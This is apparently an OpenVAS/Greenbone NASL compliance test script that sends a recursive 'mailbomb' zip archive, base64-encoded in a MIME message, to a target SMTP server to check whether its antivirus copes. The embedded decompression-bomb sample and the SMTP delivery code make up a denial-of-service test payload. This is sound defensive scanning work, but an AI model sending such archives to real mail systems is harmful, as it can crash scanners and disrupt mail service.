# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.96054");
  script_version("2023-10-31T05:06:37+0000");
  script_tag(name:"last_modification", value:"2023-10-31 05:06:37 +0000 (Tue, 31 Oct 2023)");
  script_tag(name:"creation_date", value:"2010-04-27 10:02:59 +0200 (Tue, 27 Apr 2010)");
  script_tag(name:"cvss_base", value:"0.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:N");
  script_tag(name:"qod_type", value:"remote_app");
  script_name("Send Recursive Archive (Mailbomb)");
  script_category(ACT_GATHER_INFO);
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("IT-Grundschutz");
  script_mandatory_keys("Compliance/Launch/GSHB");
  script_dependencies("compliance_tests.nasl", "smtpserver_detect.nasl", "check_smtp_helo.nasl", "smtp_settings.nasl");

  script_tag(name:"summary", value:"This script sends the Universum.zip recursive archive to the
  mail server.");

  exit(0);
}

include("smtp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

vtstrings = get_vt_strings();
fromaddr = smtp_from_header();
toaddr = smtp_to_header();

port = smtp_get_port(default:25, ignore_broken:TRUE, ignore_unscanned:TRUE);

if(!get_port_state(port)){
  set_kb_item(name:"GSHB/Mailbomb", value:"error");
  set_kb_item(name:"GSHB/Mailbomb/log", value:"get_port_state on Port " + port + " failed.");
  exit(0);
}

s = open_sock_tcp(port);
if (!s){
  set_kb_item(name:"GSHB/Mailbomb", value:"error");
  set_kb_item(name:"GSHB/Mailbomb/log", value:"open_sock_tcp on Port " + port + " failed.");
  exit(0);
}

buff = smtp_recv_banner(socket:s);
if(!buff) {
  set_kb_item(name:"GSHB/Mailbomb", value:"error");
  set_kb_item(name:"GSHB/Mailbomb/log", value:"receiving SMTP banner on Port " + port + " failed.");
  smtp_close(socket:s, check_data:buff);
  exit(0);
}

send(socket:s, data:string("HELO ", smtp_get_helo_from_kb(), "\r\n"));
buff = smtp_recv_line(socket:s);
if(!buff) {
  set_kb_item(name:"GSHB/Mailbomb", value:"error");
  set_kb_item(name:"GSHB/Mailbomb/log", value:"receiving HELO answer on Port " + port + " failed.");
  smtp_close(socket:s, check_data:buff);
  exit(0);
}

# MIME attachment
header = string("From: ", fromaddr, "\r\n",
                "To: ", toaddr, "\r\n",
                "Organization: ", vtstrings["default"], "\r\n",
                "MIME-Version: 1.0\r\n");

msg = "Subject: " + vtstrings["default"] + " Mailbomb base64 attachments
Content-Type: multipart/mixed;
boundary=------------030509000404040305080206

This is a multi-part message in MIME format.
--------------030509000404040305080206
Content-Type: text/plain; charset=ISO-8859-1
Content-Transfer-Encoding: 8bit

This Mail should include the following Files:

Universum.zip witch includes Galaxy.zip,
witch includes Solarsystem.zip,
witch includes World.zip,
witch includes Continent.zip,
witch includes State.zip,
witch includes Country.zip,
witch includes City.zip,
witch includes Hotel.zip,
witch includes Etage.zip,
witch includes Room.zip and
Bed.txt which is 1.86GB great!

If the mail get through, the danger exists that the server or client
can possibly be damaged by Similar files.

################################################################################

Diese Mail sollte folgende Anhänge anthalten:

Universum.zip mit eingeschlossem File Galaxy.zip,
mit eingeschlossem File Solarsystem.zip,
mit eingeschlossem File World.zip,
mit eingeschlossem File Continent.zip,
mit eingeschlossem File State.zip,
mit eingeschlossem File Country.zip,
mit eingeschlossem File City.zip,
mit eingeschlossem File Hotel.zip,
mit eingeschlossem File Etage.zip,
mit eingeschlossem File Room.zip und
Bed.txt welches 1,86GB groß ist!

Sollte die Mail durchgekommen sein, besteht die Gefahr, dass der Server oder
Client durch ähnliche Files evtl. geschädigt werden kann.

--------------030509000404040305080206
Content-Type: application/x-zip-compressed; name=Universum.ZIP
Content-Transfer-Encoding: base64
Content-Disposition: inline; filename=Universum.ZIP

UEsDBBQAAgAIAO1mQzytTzNJuQQAALcEAAAKAAAAR2FsYXh5LlpJUHWU/VPSBwDGv6RNt2oue7Hp
zbfaarngnBuVCrRKl5Ivc6UTFYQpzEzoREMU5Jxxlc60FzQlpVvNzlS+53sq8G29WCnCphUVEC2n
xlS+oSFCwHd120+72/Pcc597nj/gSSS6ua8FlgGewAx9T2RSHsTf7g4A3DfxAgDgW9Zhaj6byy7I
zkOTYhJXvKTTV1Mzac8yi0RThycMHVC1SFhWhjqxs+xAUek38RXkcwxgo9sIYkAd6cGUHSIqGity
qPRMgEq+SJp2yM4oZfdl3jXFJq+cnB9Pvhvj5b31E/zIp4vpDtq68lB22PFdHafLUCMFohwiuT+5
M848Yx9uEdFCiaUTg+NfpYH2gKdTtIi02Thz+3TK6PuI5T08Ly9jX3tLL+uoePCIVc0I4URRJD+H
JRSMi5ULaCIn7kWx3wYn1hTz59ad4+KQY+6x6/fyT4y6Bpmiaxyrkc/pe6wDX4tkHyvsG2aKm3oQ
LOha25VHCtecCxmjp/vlJ+1OKbzTtp90eA0vxKip60sFpXqKzAkKz/926q5GI+1zPHNscOAzxtXS
z516A3ryImWekv1g4zYsn6wvVjbzjhrV4FCnh3oOAuuC1uCc6soPKQq8+uqApJfvLDb1RTtICz7J
DY9yIa6u8SxTx6URXyzUQ/bmW0P+ja9CLabPrMxQ/UhEazcyJV+/n9Aw1G+/OtWb1JeR4hNtYogI
EPz1817bHXYcKIFcbaWC4SZIHqtCe2jacFrm6tt8ftx8SfmVh5R03tOAtKHcs3x8cEY6NvuB6PKs
3mDaNIiODLgVASu/J8Iybf22Lmx6aniX61ddlS8BLSWPBeM5HN1P24M0bZXEm6oMRg0zu3CW5yq6
Z0PUCvlSJ76bdg/0WjUg0TbHV5QOsBoeilNYW5GU3mbejlvKIoKKoxortBraZc7J2sbjzzdb4PGb
cdo68bDtoOc6TT9r5Q4WoRCT0GHJMm8RlNd0MQqCKaNPzpl19Eudi922EvA+0mQ+5A3DCtzvyVX1
lfS9sGckFJ8/wG3bl0B/JPStouRK5C6yFHnlIK0qB1N9oy1hEJJaupRWsHmG3SPX+MMRdhdNBWWc
FCCvFJrHl7GVc0KdAYMTMa7Ug01dCpPmggC/HjQZL8DDXuHy+MJqod2qRo9S8jBqcoCZsn+CUnBN
f+N+CrHPF+FzhHtKVCdxUdsl9gur0mp1i/1qw/SYoLwyAM8UM2cxdDtvoYJ5+jlm3geDixD/8FEk
Es23OV9wjfHaJuP5+OpWxSL1lFPd4NrbY5ibVFhnCuG6Jk3IkgxcXAz6Ut7F/uuGAdadgXIQi7Ql
nyBoPyqXmfTLW+dfrhy0WrmvrVfPt2hL5rqremyuJ06J7dK+K6LZhDTorupUktiMsasjR+88pVT7
pwpGcHlSy8FWDUx4LGiYS4JVk2xENZGLPES0S5x21yQyzagl8Yu/28yz3t7EBqvH6wy420jQtqgt
5uu63cs9osGbYjc/Zc8vOF/3nSoss+MLUybD8yU9y5t6vZEatAsVeynLALCSsTWBGz8guRktykD/
zrJHsSsOuP2R7dFJndpF8rgsRAGJRNSytcD/v8w/CvyX//mcROLyd97OqDfGvWGW+9v2N1BLAQIU
ABQAAgAIAO1mQzytTzNJuQQAALcEAAAKAAAAAAAAAAAAIAAAAAAAAABHYWxheHkuWklQUEsFBgAA
AAABAAEAOAAAAOEEAAAAAA==

--------------030509000404040305080206--";
msg = ereg_replace(pattern:string("\n"), string:msg, replace:string("\r\n"));

n = smtp_send_socket(socket:s, from:fromaddr, to:toaddr, body:header + msg);
smtp_close(socket:s, check_data:n);

if (n > 0) {
  log_message(port:port, data:string("The Mailbomb Testfiles was sent ", n, " times. If there is an antivirus in your MTA, it might\n",
                                     "have broken. Please check the default ", vtstrings["default"], " Mailfolder and MTA right now, as it is\n",
                                     "not possible to do so remotely\n"));
  set_kb_item(name:"GSHB/Mailbomb", value:"true");
}else if (n == 0) {
  log_message(port:port, data:"For some reason, we could not send the Mailbomb Testfiles to this MTA");
  set_kb_item(name:"GSHB/Mailbomb", value:"fail");
}

exit(0);
